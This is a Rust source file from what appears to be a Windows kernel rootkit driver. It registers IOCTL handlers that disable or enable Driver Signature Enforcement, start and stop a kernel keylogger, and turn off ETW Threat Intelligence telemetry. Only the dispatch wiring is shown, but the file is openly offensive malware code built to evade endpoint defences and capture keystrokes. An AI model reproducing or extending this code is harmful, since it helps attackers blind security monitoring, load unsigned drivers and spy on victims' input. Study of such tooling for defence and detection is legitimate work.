use {
    alloc::boxed::Box, 
    hashbrown::HashMap,
    shared::structs::{Keylogger, DSE, ETWTI},
    super::keylogger::set_keylogger_state,
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
    shared::ioctls::{IOCTL_ENABLE_DSE, IOCTL_KEYLOGGER, IOCTL_ETWTI}, 
    crate::{driver::Driver, handle_driver, misc::etwti::Etw, utils::ioctls::IoctlHandler}, 
};

pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {

    // Responsible for enabling/disabling DSE.
    ioctls.insert(IOCTL_ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_ENABLE_DSE");
        let status = unsafe { handle_driver!(stack, Driver::set_dse_state, DSE) };
        unsafe { (*irp).IoStatus.Information = 0 };
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // Start / Stop Keylogger
    ioctls.insert(IOCTL_KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_KEYLOGGER");
        let status = unsafe { handle_driver!(stack, set_keylogger_state, Keylogger) };
        unsafe { (*irp).IoStatus.Information = 0 };

        status
    }) as IoctlHandler);

    // Responsible for enabling/disabling ETWTI.
    ioctls.insert(IOCTL_ETWTI, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_ETWTI");
        let status = unsafe { handle_driver!(stack, Etw::etwti_enable_disable, ETWTI) };
        unsafe { (*irp).IoStatus.Information = 0 };

        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);
}